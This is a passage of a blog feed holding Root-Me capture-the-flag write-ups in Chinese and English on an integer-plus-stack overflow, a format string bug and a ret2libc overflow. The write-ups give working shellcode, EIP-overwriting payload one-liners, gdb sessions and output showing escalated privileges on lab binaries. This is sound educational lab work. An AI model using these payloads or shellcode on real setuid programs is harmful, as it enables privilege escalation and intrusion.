class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"> </span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> BUFFER 128</span></span><br><span class="line"> </span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">read_file</span><span class="params">(<span class="keyword">int</span> fd)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> path[BUFFER+<span class="number">1</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">  <span class="keyword">int</span> size;  </span><br><span class="line">   </span><br><span class="line">  <span class="keyword">if</span>(read(fd, &amp;size, <span class="keyword">sizeof</span>(<span class="keyword">int</span>)) != <span class="keyword">sizeof</span>(<span class="keyword">int</span>))</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">&quot;[-] File too short.\n&quot;</span>);</span><br><span class="line">      <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line">   </span><br><span class="line">  <span class="keyword">if</span>(size &gt;= BUFFER)  <span class="comment">//绕过检查</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">&quot;[-] Path too long.\n&quot;</span>);</span><br><span class="line">      <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line">  read_data(path, fd, size);</span><br><span class="line">   </span><br><span class="line">  <span class="keyword">if</span>(path[<span class="number">0</span>] != <span class="string">&#x27;/&#x27;</span>)</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">&quot;[-] Need a absolute path.\n&quot;</span>);</span><br><span class="line">      <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">    &#125;  </span><br><span class="line">   </span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;[+] The pathname is : %s\n&quot;</span>, path);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="read-命令"><a href="#read-命令" class="headerlink" title="read 命令"></a>read 命令</h3><p>ssize_t read(int fd, void *buf, size_t count);<br>read() attempts to <strong>read up to count bytes **from file descriptor fd into the</strong> buffer starting at buf**.</p><p> On success, the <code>number of bytes read is returned</code> (zero indicates end of file), and the file position is <strong>advanced by this number.</strong></p><hr><h3 id="有符号数补码"><a href="#有符号数补码" class="headerlink" title="有符号数补码"></a>有符号数补码</h3><p>Because it’s a <code>signed int</code> variable, <code>0xffffffff equals to -1</code>.</p><p>《深入理解计算机系统》中<br>有符号数整数表示:<br>1011=<code>-1*2^3+0*2^2+1*2^1+1*2^0</code>=-5<br>1000=-8<br> 0111=7<br>1111=-1<br>所以<code>0xffffffff=-0x800000+0x7fffffff=-1</code></p><h3 id="逆向"><a href="#逆向" class="headerlink" title="逆向"></a>逆向</h3><p>简单逆向后，就知道多少能到EIP</p><p><code>(python -c &quot;print &#39;\xff&#39;*4+&#39;/&#39;+&#39;A&#39;*156+&#39;B&#39;*4)</code></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Stopped reason: SIGSEGV</span><br><span class="line"><span class="number">0x42424242</span> in ?? ()</span><br></pre></td></tr></table></figure><h3 id="gdb内外地址是不同的"><a href="#gdb内外地址是不同的" class="headerlink" title="gdb内外地址是不同的"></a>gdb内外地址是不同的</h3><p>shellcode 放在0xbffffa60<br>‘\x6a\x0b\x58\x99\x52\x66\x68\x2d\x70\x89\xe1\x52\x6a\x68\x68\x2f\x62\x61\x73\x68\x2f\x62\x69\x6e\x89\xe3\x52\x51\x53\x89\xe1\xcd\x80’ 33长</p><p>(python -c “print ‘\xff’*4+’/‘+’A’*156+’0xbffffa60’[::-1]) &gt; /tmp/data.txt<br>但是还是段错误</p><p>It happens because the <code>addresses are different</code> between inside and outside of gdb (someone told me it’s because the additional environment variables gdb sets).</p><p>So to come around it, and find the actual address of the shellcode outside gdb, one can use the<code> -e switch of the strace tool</code>.<br>The -e switch enables one to set an expression which will affect the tool’s output. For example, for seeing the <code>second argument of read as an address instead of the string.</code></p><p><code>$strace -e raw=read ./ch11 /tmp/data.txt</code><br>重新设置shellcode地址</p><pre><code>app-systeme-ch11@challenge02:~$ ./ch11 /tmp/data.txt[+] The pathname is : /j                        X™Rfh-p‰áRjhh/bash/bin‰ãRQS‰á ̀                  °úÿ¿bash-4.4$ iduid=1111(app-systeme-ch11) gid=1111(app-systeme-ch11) euid=1211(app-systeme-ch11-cracked) groups=1111(app-systeme-ch11),100(users)</code></pre>]]></content>
    
    
    <summary type="html">&lt;h1 id=&quot;ELF-x86-Stack-buffer-and-integer-overflow&quot;&gt;&lt;a href=&quot;#ELF-x86-Stack-buffer-and-integer-overflow&quot; class=&quot;headerlink&quot; title=&quot;ELF x86 - Stack buffer and integer overflow&quot;&gt;&lt;/a&gt;ELF x86 - Stack buffer and integer overflow&lt;/h1&gt;&lt;p&gt;永远的神：：&lt;a href=&quot;https://github.com/s1syphu5/RootMe-Challenges/tree/master/System/ELF%20x86%20-%20Stack%20buffer%20and%20integer%20overflow&quot;&gt;https://github.com/s1syphu5/RootMe-Challenges/tree/master/System/ELF%20x86%20-%20Stack%20buffer%20and%20integer%20overflow&lt;/a&gt;&lt;/p&gt;
&lt;h2 id=&quot;ret2reg&quot;&gt;&lt;a href=&quot;#ret2reg&quot; class=&quot;headerlink&quot; title=&quot;ret2reg&quot;&gt;&lt;/a&gt;ret2reg&lt;/h2&gt;&lt;p&gt;为了让shell更实用&lt;br&gt;覆盖&lt;code&gt;EIP&lt;/code&gt;, 使用现有的命令的地址，例如&lt;code&gt;jmp esp&lt;/code&gt; ， 跳转buffer ， 后面是shellcode&lt;/p&gt;
&lt;h3 id=&quot;查找jmp-call-esp地址&quot;&gt;&lt;a href=&quot;#查找jmp-call-esp地址&quot; class=&quot;headerlink&quot; title=&quot;查找jmp/call esp地址&quot;&gt;&lt;/a&gt;查找jmp/call esp地址&lt;/h3&gt;&lt;ol&gt;
&lt;li&gt;可以在共享库中找&lt;/li&gt;
&lt;li&gt;也可以在自身程序找命令</summary>
    
    
    
    <category term="APP system in root_me" scheme="http://finsenty54.github.io/categories/APP-system-in-root-me/"/>
    
    
    <category term="PWN" scheme="http://finsenty54.github.io/tags/PWN/"/>
    
  </entry>
  
  <entry>
    <title>ELF x86 - Format String Bug Basic 3</title>
    <link href="http://finsenty54.github.io/2021/01/03/Format_String_Bug_Basic_3/"/>
    <id>http://finsenty54.github.io/2021/01/03/Format_String_Bug_Basic_3/</id>
    <published>2021-01-03T02:34:05.000Z</published>
    <updated>2021-01-07T09:15:42.824Z</updated>
    
    <content type="html"><![CDATA[<h1 id="ELF-x86-Format-String-Bug-Basic-3"><a href="#ELF-x86-Format-String-Bug-Basic-3" class="headerlink" title="ELF x86 - Format String Bug Basic 3"></a>ELF x86 - Format String Bug Basic 3</h1><a id="more"></a><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span> ** argv)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"> </span><br><span class="line">    <span class="comment">// char    log_file = &quot;/var/log/bin_error.log&quot;;</span></span><br><span class="line">    <span class="keyword">char</span>    outbuf[<span class="number">512</span>];</span><br><span class="line">    <span class="keyword">char</span>    buffer[<span class="number">512</span>];</span><br><span class="line">    <span class="keyword">char</span>    user[<span class="number">12</span>];</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">char</span> *username = <span class="string">&quot;root-me&quot;</span>;</span><br><span class="line"> </span><br><span class="line">    <span class="comment">// FILE *fp_log = fopen(log_file, &quot;a&quot;);</span></span><br><span class="line"> </span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Username: &quot;</span>);</span><br><span class="line">    fgets(user, <span class="keyword">sizeof</span>(user), <span class="built_in">stdin</span>);</span><br><span class="line">    user[<span class="built_in">strlen</span>(user) - <span class="number">1</span>] = <span class="string">&#x27;\0&#x27;</span>;</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">strcmp</span>(user, username)) &#123;</span><br><span class="line"> </span><br><span class="line">        <span class="built_in">sprintf</span> (buffer, <span class="string">&quot;ERR Wrong user: %400s&quot;</span>, user);</span><br><span class="line">        <span class="built_in">sprintf</span> (outbuf, buffer);</span><br><span class="line">        <span class="comment">// fprintf (fp_log, &quot;%s\n&quot;, outbuf);</span></span><br><span class="line">   </span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Bad username: %s\n&quot;</span>, user);</span><br><span class="line">    &#125;</span><br><span class="line">   </span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line"> </span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Hello %s ! How are you ?\n&quot;</span>, user);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// fclose(fp_log);</span></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"> </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="大体思路"><a href="#大体思路" class="headerlink" title="大体思路"></a>大体思路</h2><ol><li>shellcode 放在环境变量中</li><li>溢出，控制EIP，指向shellcode</li></ol><h3 id="snprintf-amp-sprintf"><a href="#snprintf-amp-sprintf" class="headerlink" title="snprintf &amp; sprintf"></a>snprintf &amp; sprintf</h3><pre><code>int snprintf(char *restrict s, size_t n,       const char *restrict format, ...);int sprintf(char *restrict s, const char *restrict format, ...);</code></pre><p>后面跟着format</p><p>字符串漏洞 overwrite the GOT entry</p><p><code>$ ulimit -s unlimited </code>关闭ASLR</p><hr><p>可以指定宽度，不足的左边补空格：<br>    sprintf(s, “%8d%8d”, 123, 4567); //产生：” 123 4567”</p><hr><h3 id="得到段错误"><a href="#得到段错误" class="headerlink" title="得到段错误"></a>得到段错误</h3><p><code>char *s1 @ ebp-0x414 </code> 输入放在这里</p><p>push ebp<br>此时esp 指向ebp内的值</p><p><code>0x804858b &lt;main+133&gt;:        lea    eax,[ebp-0x408]</code><br>存放buffer</p><pre><code>gdb-peda$ x/1s $ebp-0x4080xbffff730:     &quot;ERR Wrong user:&quot;, &#39; &#39; &lt;repeats 185 times&gt;...</code></pre><p><code>0x80485a1 &lt;main+155&gt;:        lea    eax,[ebp-0x208]</code><br>存放outbuffer</p><pre><code>gdb-peda$ x/100s $ebp+0x2000xbffffe01:     &quot;SHELLCODE=j\vX\231Rfh-p\211\341Rjhh/bash/bin\211\343RQS\211\341\315\200&quot;</code></pre><p>Then buffer is set to ERR Wrong user: &lt;400-9 whitespaces&gt;%200xAAAA<br>ERR Wrong user:  长度是16</p><p> outbuf is set to ERR Wrong user: &lt;400-9 whitespaces&gt;&lt;200 bytes&gt;AAAA</p><p>576 space +7 =583 个space  + 8字节 + AAAA<br>因为%x打印8个数，然后再存的话就是8字节<br>gdb-peda$ x/1s $ebp<br>0xbffffb18:     ‘ ‘ &lt;repeats 79 times&gt;, “30303225AAAA”</p><p>那么<br>113 覆盖ebp的位置<br>EBP: 0xbffffb18 (“aaaa”)</p><p>%117xaaaa<br>执行leave后，esp指向aaaa<br>EIP: 0x61616161 (‘aaaa’)</p><p>shellcode</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">export SHELLCODE=`python -c &#x27;print(&quot;\x6a\x0b\x58\x99\x52\x66\x68\x2d\x70\x89\xe1\x52\x6a\x68\x68\x2f\x62\x61\x73\x68\x2f\x62\x69\x6e\x89\xe3\x52\x51\x53\x89\xe1\xcd\x80&quot;)&#x27;`</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">gdb-peda$ x/<span class="number">1</span>s <span class="number">0xbffffe02</span>+<span class="number">0xa</span></span><br><span class="line"><span class="number">0xbffffe0c</span>:     <span class="string">&quot;j\vX\231Rfh-p\211\341Rjhh/bash/bin\211\343RQS\211\341\315\200&quot;</span></span><br></pre></td></tr></table></figure><p>palyload:<br>(python -c “print ‘%117x’ + ‘\x0c\xfe\xff\xbf’”;cat) | ./ch17</p><p>但是报段错误，还没想到原因。</p><h3 id="解决方法"><a href="#解决方法" class="headerlink" title="解决方法"></a>解决方法</h3><p>原因应该是gdb内外的地址是不一样的<br><a href="https://github.com/s1syphu5/RootMe-Challenges/tree/master/System/ELF%20x86%20-%20Stack%20buffer%20overflow%20basic%204">https://github.com/s1syphu5/RootMe-Challenges/tree/master/System/ELF%20x86%20-%20Stack%20buffer%20overflow%20basic%204</a><br>使用这篇中的findenv.c</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span> * argv[])</span> </span>&#123;</span><br><span class="line">    <span class="keyword">char</span> *ptr;</span><br><span class="line">    <span class="keyword">if</span>(argc&lt;<span class="number">3</span>)&#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Usage: %s &lt;environment var&gt; &lt;target program name&gt;\n&quot;</span>, argv[<span class="number">0</span>]);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    ptr = getenv(argv[<span class="number">1</span>]);</span><br><span class="line">    ptr += (<span class="built_in">strlen</span>(argv[<span class="number">0</span>]) - <span class="built_in">strlen</span>(argv[<span class="number">2</span>])) * <span class="number">2</span>;  </span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%s will be at %p\n&quot;</span>, argv[<span class="number">1</span>], ptr);</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>使用touch，vim命令创建文件</p><pre><code>app-systeme-ch17@challenge02:~$ /tmp/findenv SHELLCODE ./ch17SHELLCODE will be at 0xbffffe31app-systeme-ch17@challenge02:~$ (python -c &quot;print &#39;%117x&#39;+&#39;\x31\xfe\xff\xbf&#39;&quot; ;cat ) | ./ch17Username: Bad username: %117x1þÿ¿iduid=1117(app-systeme-ch17) gid=1117(app-systeme-ch17) euid=1217(app-systeme-ch17-cracked) groups=1117(app-systeme-ch17),100(users)</code></pre><h3 id="学到的命令"><a href="#学到的命令" class="headerlink" title="学到的命令"></a>学到的命令</h3><p><code>show env PATH</code></p><p><code>echo $PATH</code></p><p>%x 打印32位</p>]]></content>
    
    
    <summary type="html">&lt;h1 id=&quot;ELF-x86-Format-String-Bug-Basic-3&quot;&gt;&lt;a href=&quot;#ELF-x86-Format-String-Bug-Basic-3&quot; class=&quot;headerlink&quot; title=&quot;ELF x86 - Format String Bug Basic 3&quot;&gt;&lt;/a&gt;ELF x86 - Format String Bug Basic 3&lt;/h1&gt;</summary>
    
    
    
    <category term="APP system in root_me" scheme="http://finsenty54.github.io/categories/APP-system-in-root-me/"/>
    
    
    <category term="PWN" scheme="http://finsenty54.github.io/tags/PWN/"/>
    
  </entry>
  
  <entry>
    <title>ELF x86 - Stack buffer overflow basic 6</title>
    <link href="http://finsenty54.github.io/2020/12/31/Stack_buffer_overflow_basic_6/"/>
    <id>http://finsenty54.github.io/2020/12/31/Stack_buffer_overflow_basic_6/</id>
    <published>2020-12-31T06:08:34.000Z</published>
    <updated>2020-12-31T06:36:36.193Z</updated>
    
    <content type="html"><![CDATA[<h1 id="ELF-x86-Stack-buffer-overflow-basic-6"><a href="#ELF-x86-Stack-buffer-overflow-basic-6" class="headerlink" title="ELF x86 - Stack buffer overflow basic 6"></a>ELF x86 - Stack buffer overflow basic 6</h1><p><code>return to libc</code></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span> <span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span> ** argv)</span></span>&#123;</span><br><span class="line">    <span class="keyword">char</span> message[<span class="number">20</span>];</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">if</span> (argc != <span class="number">2</span>)&#123;</span><br><span class="line">        <span class="built_in">printf</span> (<span class="string">&quot;Usage: %s &lt;message&gt;\n&quot;</span>, argv[<span class="number">0</span>]);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    setreuid(geteuid(), geteuid());</span><br><span class="line">    <span class="built_in">strcpy</span> (message, argv[<span class="number">1</span>]);</span><br><span class="line">    <span class="built_in">printf</span> (<span class="string">&quot;Your message: %s\n&quot;</span>, message);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><a id="more"></a><h2 id="知识学习"><a href="#知识学习" class="headerlink" title="知识学习"></a>知识学习</h2><h3 id="setuid-amp-setgid"><a href="#setuid-amp-setgid" class="headerlink" title="setuid &amp; setgid"></a>setuid &amp; setgid</h3><p>When the** setuid or setgid <strong>attributes are set on an executable file, then any users able to **execute the file will automatically execute the file with the privileges of the file’s owner (commonly root)</strong> and/or the file’s group, depending upon the flags set<br>普通用户提升权限运行<br>The setuid and setgid bits are normally set with the command chmod by setting the high-<strong>order octal digit to 4 for setuid or 2 for setgid</strong>. “chmod 6711 file” will set both the setuid and setgid bits (4+2=6), making the file read/write/executable for the owner (7), and executable by the group (first 1) and others (second 1). When a user other than the owner executes the file,** the process will run with user and group permissions set upon it by its owner**. For example, if the file is owned by user root and group wheel, it will run as root:wheel no matter who executes the file.<br><code>chmod +s</code></p><h3 id="防御-降权-seteuid"><a href="#防御-降权-seteuid" class="headerlink" title="防御-降权 seteuid()"></a>防御-降权 seteuid()</h3><p>Normal approach followed by root setuid programs is to drop root privileges before getting input from the user. Thus even when user input is malicious, attacker wont get a root shell.<br>root setuid接收用户输入后，丢弃root权限<br>For** example below vulnerable code **wont allow the attacker to get a root shell.</p><pre><code> seteuid(getuid()); /* Temporarily drop privileges */ </code></pre><h3 id="sticky-bit"><a href="#sticky-bit" class="headerlink" title="sticky bit"></a>sticky bit</h3><p>When a directory’s sticky bit is set, the filesystem treats the files in such directories in a special way <strong>so only the file’s owner,</strong> the directory’s owner, or root user can rename or delete the file. </p><pre><code>ls -l testchmod +t test; ls -l test</code></pre><h3 id="setreuid"><a href="#setreuid" class="headerlink" title="setreuid()"></a>setreuid()</h3><p><code>setreuid(geteuid(), geteuid());</code> 这是提升权限<br>每个Linux进程都有有两个相关的用户ID：实际用户ID（即ruid）和有效用户ID（即euid），其中ruid表示了该进程由谁运行，即当前系统环境用户是谁，主要回答who am I?的问题；而euid则用来规范进程的实际权限控制。比如passwd文件存放了用户名和密码，当一个普通用户运行passwd时，其ruid是自己，而euid则临时变为了文件的所有者root。<br>setreuid的作用在于设置ruid和euid</p><h3 id="geteuid"><a href="#geteuid" class="headerlink" title="geteuid()"></a>geteuid()</h3><p>geteuid()用来取得执行目前进程有效的用户识别码. 有效的用户识别码用来<strong>决定进程执行的权限,</strong> 借由此改变此值, 进程可以<strong>获得额外的权限</strong>. 倘若执行文件的setID 位已被设置, 该文件执行时, 其进程的euid值便会设成该文件所有者的uid. 例如, 执行文件/usr/bin/passwd 的权限为-r-s–x–x, 其s 位即为setID(SUID)位, 而当任何用户在执行passwd 时其有效的用户识别码会被设成passwd 所有者的uid 值, <strong>即root 的uid 值(0)</strong>.</p><pre><code>app-systeme-ch13@challenge02:~$ ls -l ./ch13-r-sr-x--- 1 app-systeme-ch13-cracked app-systeme-ch13 7360 May 19  2019 ./ch13</code></pre><h3 id="关闭ASLR-原来值是2"><a href="#关闭ASLR-原来值是2" class="headerlink" title="关闭ASLR 原来值是2"></a>关闭ASLR 原来值是2</h3><p>使用<code>sudo sh -c &quot;echo 0 &gt; /proc/sys/kernel/randomize_va_space&quot;</code>即可关闭ASLR</p><hr><h2 id="ret2lic入门"><a href="#ret2lic入门" class="headerlink" title="ret2lic入门"></a>ret2lic入门</h2><p><a href="https://sploitfun.wordpress.com/2015/05/08/bypassing-nx-bit-using-return-to-libc/">https://sploitfun.wordpress.com/2015/05/08/bypassing-nx-bit-using-return-to-libc/</a></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"> <span class="comment">//vuln.c</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span>* argv[])</span> </span>&#123;</span><br><span class="line"> <span class="keyword">char</span> buf[<span class="number">256</span>]; <span class="comment">/* [1] */</span> </span><br><span class="line"> <span class="built_in">strcpy</span>(buf,argv[<span class="number">1</span>]); <span class="comment">/* [2] */</span></span><br><span class="line"> <span class="built_in">printf</span>(<span class="string">&quot;%s\n&quot;</span>,buf); <span class="comment">/* [3] */</span></span><br><span class="line"> fflush(<span class="built_in">stdout</span>);  <span class="comment">/* [4] */</span></span><br><span class="line"> <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>r $(python2 -c &quot;print &#39;A&#39;*270&quot;)</code><br>溢出 64位下<br><code>Invalid $PC address: 0x414141414141</code></p><hr><h2 id="解题"><a href="#解题" class="headerlink" title="解题"></a>解题</h2><p>逆向</p><pre><code>gdb-peda$ r $(python -c &quot;print &#39;a&#39;*36&quot;)Stopped reason: SIGSEGV0x61616161 in ?? ()</code></pre><p>查看</p><pre><code>gdb-peda$ print system$2 = &#123;&lt;text variable, no debug info&gt;&#125; 0xb7e68310 &lt;system&gt;gdb-peda$ print exit$3 = &#123;&lt;text variable, no debug info&gt;&#125; 0xb7e5b260 &lt;exit&gt;x/4000s $rsp0xbffffef8:     &quot;SHELL=/bin/bash&quot;gdb-peda$ x/s 0xbffffef8+60xbffffefe:     &quot;/bin/bash&quot;、x</code></pre><p>将这三项连接在一起<br><code>r $(python -c &quot;print &#39;a&#39;*32+&#39;\x10\x83\xe6\xb7&#39;+&#39;\x60\xb2\xe5\xb7&#39;+&#39;\xfe\xfe\xff\xbf&#39;&quot;) </code></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">gdb-peda$ c</span><br><span class="line">Continuing.</span><br><span class="line">Your message: aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaƒæ·`²å·þþÿ¿</span><br><span class="line">[New process <span class="number">5677</span>]</span><br><span class="line">process <span class="number">5677</span> is executing <span class="keyword">new</span> program: /bin/dash</span><br><span class="line">Error in re-setting breakpoint <span class="number">1</span>: Function <span class="string">&quot;main&quot;</span> <span class="keyword">not</span> defined.</span><br><span class="line">Warning:</span><br><span class="line">Cannot insert breakpoint <span class="number">2.</span></span><br><span class="line">Cannot access memory at address </span><br></pre></td></tr></table></figure><p>报错不成功</p><p><code>(gdb) info proc map</code><br>查看虚拟空间布局</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">Start Addr   End Addr       Size     Offset objfile</span><br><span class="line"> 0x8048000  0x8049000     0x1000        0x0 /challenge/app-systeme/ch33/ch33</span><br><span class="line"> 0x8049000  0x804a000     0x1000        0x0 /challenge/app-systeme/ch33/ch33</span><br><span class="line"> 0x804a000  0x804b000     0x1000     0x1000 /challenge/app-systeme/ch33/ch33</span><br><span class="line">0xb7e27000 0xb7e28000     0x1000        0x0</span><br><span class="line">0xb7e28000 0xb7fd3000   0x1ab000        0x0 /libold/i386-linux-gnu/libc.so.6</span><br><span class="line">0xb7fd3000 0xb7fd5000     0x2000   0x1aa000 /libold/i386-linux-gnu/libc.so.6</span><br><span class="line">0xb7fd5000 0xb7fd6000     0x1000   0x1ac000 /libold/i386-linux-gnu/libc.so.6</span><br><span class="line">0xb7fd6000 0xb7fda000     0x4000        0x0</span><br><span class="line">0xb7fda000 0xb7fdd000     0x3000        0x0 [vvar]</span><br><span class="line">0xb7fdd000 0xb7fde000     0x1000        0x0 [vdso]</span><br><span class="line">0xb7fde000 0xb7ffe000    0x20000        0x0 /libold/i386-linux-gnu/ld-2.19.so</span><br><span class="line">0xb7ffe000 0xb7fff000     0x1000    0x1f000 /libold/i386-linux-gnu/ld-2.19.so</span><br><span class="line">0xb7fff000 0xb8000000     0x1000    0x20000 /libold/i386-linux-gnu/ld-2.19.so</span><br><span class="line">0xbffdf000 0xc0000000    0x21000        0x0 [stack]</span><br><span 